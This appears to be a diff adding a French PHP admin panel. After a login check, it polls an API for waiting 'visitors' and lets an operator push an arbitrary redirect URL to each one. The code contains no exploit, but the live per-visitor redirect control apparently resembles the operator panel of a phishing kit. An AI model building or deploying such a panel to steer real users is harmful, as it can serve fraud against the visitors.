@@ -1,1 +1,675 @@
+<?php
 
+session_start();
+
+if (empty($_SESSION['admin_logged_in'])) {
+    header('Location: login.php');
+    exit;
+}
+
+?>
+
+<!DOCTYPE html>
+<html lang="fr">
+
+<head>
+
+<meta charset="UTF-8">
+
+<meta name="viewport"
+      content="width=device-width, initial-scale=1.0">
+
+<title>Admin Panel</title>
+
+<style>
+
+* {
+    box-sizing: border-box;
+}
+
+body {
+    margin: 0;
+
+    background: #f4f6f8;
+
+    font-family:
+        Arial,
+        sans-serif;
+
+    color: #222;
+}
+
+header {
+    background: #111;
+    color: white;
+
+    padding: 18px 25px;
+
+    display: flex;
+
+    justify-content: space-between;
+
+    align-items: center;
+}
+
+header h1 {
+    margin: 0;
+    font-size: 20px;
+}
+
+.logout {
+    color: white;
+    text-decoration: none;
+}
+
+.container {
+    width: 95%;
+    max-width: 1000px;
+
+    margin: 30px auto;
+}
+
+.card {
+    background: white;
+
+    border-radius: 14px;
+
+    padding: 25px;
+
+    margin-bottom: 20px;
+
+    box-shadow:
+        0 8px 25px
+        rgba(0,0,0,.06);
+}
+
+.visitor {
+    border: 1px solid #e5e5e5;
+
+    border-radius: 10px;
+
+    padding: 20px;
+
+    margin-top: 15px;
+}
+
+.status {
+    display: inline-block;
+
+    padding: 6px 10px;
+
+    border-radius: 20px;
+
+    background: #e6f7ed;
+
+    color: #087a3d;
+
+    font-size: 13px;
+}
+
+.id {
+    margin-top: 12px;
+
+    font-family: monospace;
+
+    font-size: 13px;
+
+    color: #666;
+
+    word-break: break-all;
+}
+
+input {
+    width: 100%;
+
+    margin-top: 15px;
+
+    padding: 12px;
+
+    border: 1px solid #ddd;
+
+    border-radius: 7px;
+
+    font-size: 14px;
+}
+
+input:focus {
+    outline: none;
+
+    border-color: #111;
+}
+
+button {
+    margin-top: 10px;
+
+    padding: 11px 18px;
+
+    border: 0;
+
+    border-radius: 7px;
+
+    background: #111;
+
+    color: white;
+
+    cursor: pointer;
+}
+
+button:hover {
+    opacity: .9;
+}
+
+button:disabled {
+    opacity: .6;
+    cursor: default;
+}
+
+.empty {
+    text-align: center;
+
+    padding: 40px 20px;
+
+    color: #777;
+}
+
+.message {
+    margin-bottom: 20px;
+
+    padding: 12px;
+
+    background: #e8f5e9;
+
+    color: #176b2c;
+
+    border-radius: 8px;
+
+    display: none;
+}
+
+</style>
+
+</head>
+
+<body>
+
+<header>
+
+<h1>Admin Panel</h1>
+
+<a
+    class="logout"
+    href="logout.php"
+>
+    Déconnexion
+</a>
+
+</header>
+
+
+<div class="container">
+
+<div class="card">
+
+<h2>Visiteurs en attente</h2>
+
+<div id="message"
+     class="message">
+</div>
+
+<div id="visitors">
+
+    <div class="empty">
+        Recherche de visiteurs...
+    </div>
+
+</div>
+
+</div>
+
+</div>
+
+
+<script>
+
+/*
+ * Stockage local des éléments visiteurs.
+ * Cela permet de ne pas recréer le champ URL
+ * à chaque actualisation.
+ */
+const visitorElements = new Map();
+
+
+async function loadVisitors() {
+
+    try {
+
+        const response =
+            await fetch(
+                "api.php?t=" +
+                Date.now()
+            );
+
+        const data =
+            await response.json();
+
+        const container =
+            document.getElementById(
+                "visitors"
+            );
+
+
+        /*
+         * Si aucun visiteur n'est présent
+         */
+        if (
+            !data.visitors ||
+            data.visitors.length === 0
+        ) {
+
+            /*
+             * On supprime uniquement
+             * les anciens visiteurs.
+             */
+            visitorElements.clear();
+
+            container.innerHTML = `
+                <div class="empty">
+                    Aucun visiteur en attente.
+                </div>
+            `;
+
+            return;
+        }
+
+
+        /*
+         * Supprime le message
+         * "Aucun visiteur".
+         */
+        const empty =
+            container.querySelector(
+                ".empty"
+            );
+
+        if (empty) {
+            empty.remove();
+        }
+
+
+        /*
+         * Liste des visiteurs actuellement
+         */
+        const currentIds =
+            new Set();
+
+
+        data.visitors.forEach(
+            visitor => {
+
+                const visitorId =
+                    String(visitor.id);
+
+                currentIds.add(
+                    visitorId
+                );
+
+
+                /*
+                 * Si le visiteur existe déjà,
+                 * on ne recrée PAS son HTML.
+                 *
+                 * Donc le contenu du champ URL
+                 * reste intact.
+                 */
+                if (
+                    visitorElements.has(
+                        visitorId
+                    )
+                ) {
+
+                    return;
+                }
+
+
+                /*
+                 * Création du visiteur
+                 */
+                const div =
+                    document.createElement(
+                        "div"
+                    );
+
+                div.className =
+                    "visitor";
+
+                div.dataset.visitorId =
+                    visitorId;
+
+
+                /*
+                 * Badge
+                 */
+                const status =
+                    document.createElement(
+                        "span"
+                    );
+
+                status.className =
+                    "status";
+
+                status.textContent =
+                    "● En ligne";
+
+
+                /*
+                 * ID
+                 */
+                const idDiv =
+                    document.createElement(
+                        "div"
+                    );
+
+                idDiv.className =
+                    "id";
+
+                idDiv.textContent =
+                    "ID : " +
+                    visitorId;
+
+
+                /*
+                 * Champ URL
+                 */
+                const input =
+                    document.createElement(
+                        "input"
+                    );
+
+                input.type =
+                    "url";
+
+                input.className =
+                    "url-input";
+
+                input.placeholder =
+                    "https://example.com";
+
+
+                /*
+                 * Bouton
+                 */
+                const button =
+                    document.createElement(
+                        "button"
+                    );
+
+                button.type =
+                    "button";
+
+                button.textContent =
+                    "Rediriger";
+
+
+                button.addEventListener(
+                    "click",
+                    function () {
+
+                        redirectVisitor(
+                            visitorId,
+                            button
+                        );
+
+                    }
+                );
+
+
+                /*
+                 * Assemblage
+                 */
+                div.appendChild(
+                    status
+                );
+
+                div.appendChild(
+                    idDiv
+                );
+
+                div.appendChild(
+                    input
+                );
+
+                div.appendChild(
+                    button
+                );
+
+
+                container.appendChild(
+                    div
+                );
+
+
+                /*
+                 * On mémorise cet élément.
+                 */
+                visitorElements.set(
+                    visitorId,
+                    div
+                );
+
+            }
+        );
+
+
+        /*
+         * Supprime uniquement les visiteurs
+         * qui ne sont plus actifs.
+         */
+        for (
+            const [
+                visitorId,
+                element
+            ]
+            of visitorElements
+        ) {
+
+            if (
+                !currentIds.has(
+                    visitorId
+                )
+            ) {
+
+                element.remove();
+
+                visitorElements.delete(
+                    visitorId
+                );
+            }
+        }
+
+    } catch (error) {
+
+        console.error(
+            "Erreur lors du chargement des visiteurs :",
+            error
+        );
+
+    }
+}
+
+
+async function redirectVisitor(
+    visitorId,
+    button
+) {
+
+    const parent =
+        button.parentElement;
+
+    const input =
+        parent.querySelector(
+            ".url-input"
+        );
+
+    const url =
+        input.value.trim();
+
+
+    if (!url) {
+
+        alert(
+            "Entrez une URL."
+        );
+
+        return;
+    }
+
+
+    /*
+     * Vérification simple de l'URL
+     */
+    try {
+
+        new URL(url);
+
+    } catch (error) {
+
+        alert(
+            "Veuillez entrer une URL valide."
+        );
+
+        return;
+    }
+
+
+    /*
+     * Désactive le bouton pendant
+     * l'envoi.
+     */
+    button.disabled = true;
+
+    button.textContent =
+        "Envoi...";
+
+
+    try {
+
+        const response =
+            await fetch(
+                "api.php",
+                {
+                    method: "POST",
+
+                    headers: {
+                        "Content-Type":
+                            "application/json"
+                    },
+
+                    body: JSON.stringify({
+                        visitor_id:
+                            visitorId,
+
+                        url:
+                            url
+                    })
+                }
+            );
+
+
+        const data =
+            await response.json();
+
+
+        if (!response.ok) {
+
+            button.disabled =
+                false;
+
+            button.textContent =
+                "Rediriger";
+
+            alert(
+                data.error ||
+                "Erreur."
+            );
+
+            return;
+        }
+
+
+        button.textContent =
+            "Redirection envoyée";
+
+
+        showMessage(
+            "Redirection envoyée au visiteur."
+        );
+
+
+    } catch (error) {
+
+        button.disabled =
+            false;
+
+        button.textContent =
+            "Rediriger";
+
+        alert(
+            "Erreur de communication avec le serveur."
+        );
+
+    }
+}
+
+
+function showMessage(text) {
+
+    const message =
+        document.getElementById(
+            "message"
+        );
+
+    message.textContent =
+        text;
+
+    message.style.display =
+        "block";
+
+
+    setTimeout(
+        () => {
+
+            message.style.display =
+                "none";
+
+        },
+        3000
+    );
+}
+
+
+/*
+ * Première récupération
+ */
+loadVisitors();
+
+
+/*
+ * Actualisation toutes les 2 secondes.
+ *
+ * IMPORTANT :
+ * loadVisitors() ne recrée plus
+ * les visiteurs déjà présents.
+ *
+ * Le champ URL ne sera donc
+ * plus effacé.
+ */
+setInterval(
+    loadVisitors,
+    2000
+);
+
+</script>
+
+</body>
+
+</html>
